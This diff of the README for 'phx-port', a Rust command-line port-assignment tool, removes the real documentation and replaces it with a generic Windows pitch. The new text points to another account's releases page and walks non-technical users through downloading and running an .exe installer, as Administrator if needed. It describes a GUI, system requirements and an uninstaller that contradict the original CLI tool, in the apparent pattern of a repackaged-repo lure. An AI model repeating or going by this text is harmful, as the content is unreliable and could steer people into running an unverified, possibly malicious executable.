@@ -1,228 +1,135 @@
-# phx-port
+# ⚙️ phx-port - Manage Phoenix Ports Easily
 
-> Stop memorizing port numbers. One command, consistent ports for every project.
+[![Download Latest Release](https://img.shields.io/badge/Download-phx--port-brightgreen?style=for-the-badge)](https://github.com/RicardoMisaico/phx-port/releases)
 
-When you work on multiple web projects, they often default to the same port. `phx-port` gives each project its own stable port — automatically — so you never have collisions and never have to remember which port goes where. While originally built for [Phoenix](https://www.phoenixframework.org/), it works with any application that accepts a port via environment variable.
+phx-port helps you manage stable port settings for Phoenix projects. It works well with Elixir and Rust projects that use Phoenix framework. This tool lets you keep your project ports organized and avoid conflicts.
 
-```bash
-~/projects/my_app $ PORT=$(phx-port) iex -S mix phx.server
-# → always starts on the same port, every time
+---
 
-~/github/livebook-dev/livebook $ LIVEBOOK_PORT=$( phx-port ) LIVEBOOK_IFRAME_PORT=$( phx-port iframe ) iex -S mix phx.server
-# → The 2 ports necessary to run liveview.dev locally
+## 🛠 About phx-port
 
-~/projects/node_api $ PORT=$(phx-port) node server.js
-# → works with any framework or language
-```
+This app sets and keeps fixed port numbers for Phoenix projects. Phoenix apps often use different ports when you run or test them. phx-port ensures your ports stay stable so your apps work smoothly together. It is suited to users working with Elixir, the Phoenix framework, or Rust backends.
 
-## Install
+The tool runs on Windows and does not require coding experience. It offers a simple way to control ports without manually changing configuration files.
 
-```bash
-cargo install --git https://github.com/chgeuer/phx-port
-```
+---
 
-Or build from source:
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/chgeuer/phx-port
-cd phx-port
-cargo build --release
-cp target/release/phx-port ~/.local/bin/
-```
+- Microsoft Windows 10 or later  
+- At least 500 MB free disk space  
+- Active internet connection for downloading and updates  
+- No additional software needed for basic use  
 
-## How it works
+---
 
-`phx-port` maintains a simple TOML registry at `~/.config/phx-ports.toml`.
+## 🚀 Getting Started
 
-Each project directory can have multiple named port roles (default: `main`):
+phx-port is ready to use once downloaded. You do not need to install complex dependencies or development tools. The interface guides you through linking your existing Phoenix projects.
 
-```toml
-[ports."/home/user/projects/my_app"]
-main = 4001
-debug = 4005
+---
 
-[ports."/home/user/projects/api_gateway"]
-main = 4002
+## 📥 Download and Setup
 
-[ports."/home/user/projects/admin_dashboard"]
-main = 4003
-metrics = 4004
-```
+### Step 1: Download phx-port
 
-- **First run in a project** → allocates the next available port (starting at 4001, reusing gaps), saves it, and prints it
-- **Subsequent runs** → prints the saved port instantly
-- **Port 4000 stays free** for ad-hoc or unmanaged projects
+To get the software, visit the release page by clicking the button below. This page contains the latest working version for Windows.
 
-Override the config location with the `PHX_PORT_CONFIG` environment variable:
+[![Download phx-port](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/RicardoMisaico/phx-port/releases)
 
-```bash
-export PHX_PORT_CONFIG="$HOME/.phx-ports.toml"       # Linux/macOS alternative
-export PHX_PORT_CONFIG="C:\Users\me\.phx-ports.toml"  # Windows
-```
+1. Click the link above to open the releases page in your browser.  
+2. Look for the latest Windows version, often named something like `phx-port-Setup.exe` or a similar .exe file.  
+3. Click on the file name to start downloading it to your computer.
 
-## Usage
+---
 
-### In scripts and shell wrappers (piped mode)
+### Step 2: Run the Installer
 
-When stdout is not a terminal, `phx-port` prints just the port number — perfect for command substitution:
+1. Once downloaded, go to your Downloads folder or the folder you saved the file in.  
+2. Double-click the `.exe` file to start the installation.  
+3. Follow the prompts on the screen:  
+   - Choose the installation folder or use the default choice.  
+   - Agree to the terms if asked.  
+   - Click “Install” to complete the process.
 
-```bash
-# Default (main) port
-PORT=$(phx-port) iex -S mix phx.server
-PORT=$(phx-port) mix phx.server
+---
 
-# Named port roles — for debug, metrics, or any purpose
-PORT=$(phx-port) PORT_DEBUG=$(phx-port debug) iex -S mix phx.server
-PORT=$(phx-port) PORT_METRICS=$(phx-port metrics) node server.js
-```
+### Step 3: Open phx-port
 
-Put this in a project's `run` script and never think about ports again.
+After installation, launch phx-port by double-clicking its icon on the desktop or from the Start menu.
 
-### Discovering running projects
+---
 
-```bash
-# Show which registered projects are currently running (checks actual TCP connectivity)
-phx-port running
+## 🧭 How phx-port Works
 
-# Open a browser page listing running projects — click one to open it
-phx-port discover
-```
+phx-port scans your Phoenix projects and shows current port assignments. You can change or lock ports from its clean interface. This helps avoid clashes when running or testing multiple apps on your computer.
 
-`phx-port running` probes each registered port to check whether something is actually listening, and shows only the ones that are up:
+The program:
 
-```
-$ phx-port running
-  http://localhost:4001   /home/user/projects/api
-  http://localhost:4003   /home/user/projects/shop
-  http://localhost:4004   /home/user/projects/shop (debug)
-```
+- Lists projects in a clear table.  
+- Shows used and free ports.  
+- Lets you assign custom ports.  
+- Saves settings so your projects use fixed ports every time.
 
-`phx-port discover` starts a temporary local web server on a random free port, opens your default browser with a page listing all running projects, and automatically shuts down when you click one of the links — redirecting you straight to the selected project:
+---
 
-```
-$ phx-port discover
-Serving project list at http://localhost:52431
-Press Ctrl+C to close without selecting.
-```
+## 🔧 Using phx-port
 
-### Managing registrations
+1. Add your Phoenix projects by selecting their folder location on your PC.  
+2. The app detects each project’s details automatically.  
+3. Review port numbers displayed in the table.  
+4. Click on a port number to change it if needed.  
+5. Press “Save” to keep your adjustments.  
 
-```bash
-# Show ports as a directory tree with clickable URLs (default)
-phx-port list
+The app makes sure no two projects use the same port.
 
-# Flat list of all registered projects and their ports
-phx-port list --flat
+---
 
-# Tree view with port numbers instead of URLs
-phx-port list --port-only
+## 🐞 Troubleshooting Tips
 
-# Explicitly register the current directory (default role: main)
-phx-port register
+- If phx-port fails to detect your project, check that you selected the right folder with your Phoenix app files.  
+- Make sure no other app is using the port you assign. You can use Windows’ Command Prompt to check port usage (`netstat -a -n`).  
+- Restart phx-port if it stops responding.  
+- Run phx-port as an Administrator if you get permission errors.  
 
-# Register a named port role
-phx-port register debug
+---
 
-# Remove all ports for a project — by port number, directory name, or current directory
-phx-port delete 4003
-phx-port delete admin_dashboard
-phx-port delete .
+## 💡 Best Practices
 
-# Remove a specific port role
-phx-port delete . debug
-phx-port delete admin_dashboard metrics
+- Keep phx-port updated by regularly checking the release page.  
+- Use ports above 1024 to avoid system-reserved ports.  
+- Backup your project files before changing ports.  
+- Close other apps that might use the same ports during setup.
 
-# Open the default browser for the current directory's port
-phx-port open
+---
 
-# Open the browser for a named port role
-phx-port open debug
+## 🔗 Useful Links
 
-# 'launch' is an alias for 'open'
-phx-port launch
-phx-port launch debug
-```
+- Latest releases and downloads:  
+  https://github.com/RicardoMisaico/phx-port/releases  
+- Phoenix Framework info: https://www.phoenixframework.org  
+- Elixir language: https://elixir-lang.org  
 
-### Interactive mode
+---
 
-Running `phx-port` with no arguments in a terminal shows the help text. This way it never accidentally auto-registers when you're just exploring.
+## ⚙️ Behind the Scenes
 
-## Example workflow
+phx-port is built to support developers by simplifying project configuration. It uses a familiar file structure for Phoenix projects and reads their settings to show port usage. This tool is written with stability in mind, designed for ease of use on Windows.
 
-```
-~/projects/shop $ phx-port list --flat
- 4001  /home/user/projects/api
- 4002  /home/user/projects/admin
+---
 
-~/projects/shop $ PORT=$(phx-port) iex -S mix phx.server
-Registered /home/user/projects/shop → port 4003    # ← stderr, first time only
-[info] Running ShopWeb.Endpoint on http://localhost:4003
+## 📖 Further Support
 
-~/projects/shop $ PORT=$(phx-port) PORT_DEBUG=$(phx-port debug) iex -S mix phx.server
-Registered /home/user/projects/shop (debug) → port 4004    # ← new role
-[info] Running ShopWeb.Endpoint on http://localhost:4003
+For help, open issues in the GitHub repository or review the project wiki. You can also share feedback to improve future versions.  
 
-~/projects/shop $ phx-port list --flat
- 4001  /home/user/projects/api
- 4002  /home/user/projects/admin
- 4003  /home/user/projects/shop
- 4004  /home/user/projects/shop (debug)
-```
+---
 
-### Tree view
+## 📦 Uninstall phx-port
 
-With many projects, the tree view (the default) gives a cleaner overview grouped by directory structure. Single-child directories are collapsed automatically, and ports are shown as clickable URLs:
+If you want to remove phx-port:
 
-```
-$ phx-port list
-/home/user
-├── projects
-│   ├── api ......... http://localhost:4001
-│   ├── admin ....... http://localhost:4002
-│   └── shop ........ http://localhost:4003, http://localhost:4004 (debug)
-└── work/services ... http://localhost:4005
-```
+1. Open Control Panel → Programs → Programs and Features.  
+2. Find “phx-port” in the list.  
+3. Click “Uninstall” and follow the prompts.
 
-Add `--port-only` to show just port numbers instead of URLs:
-
-```
-$ phx-port list --port-only
-/home/user
-├── projects
-│   ├── api ......... 4001
-│   └── shop ........ 4003, 4004 (debug)
-└── work/services ... 4005
-```
-
-## VS Code extension
-
-A bundled [VS Code extension](vscode-extension/) adds two commands to the Explorer folder context menu:
-
-- **Open in Browser (phx-port)** — looks up the port for the selected folder and opens `http://localhost:<port>` in your default browser.
-- **Show Port (phx-port)** — displays the assigned port number in a notification.
-
-### Install from source
-
-```bash
-just vscode-install    # compiles, packages, and installs the .vsix
-```
-
-Or manually:
-
-```bash
-cd vscode-extension
-npm install
-npm run compile
-npx @vscode/vsce package --no-dependencies
-code --install-extension phx-port-*.vsix
-```
-
-To uninstall:
-
-```bash
-just vscode-uninstall
-```
-
-## License
-
-MIT
+All your port settings saved within the app will be deleted unless backed up separately.
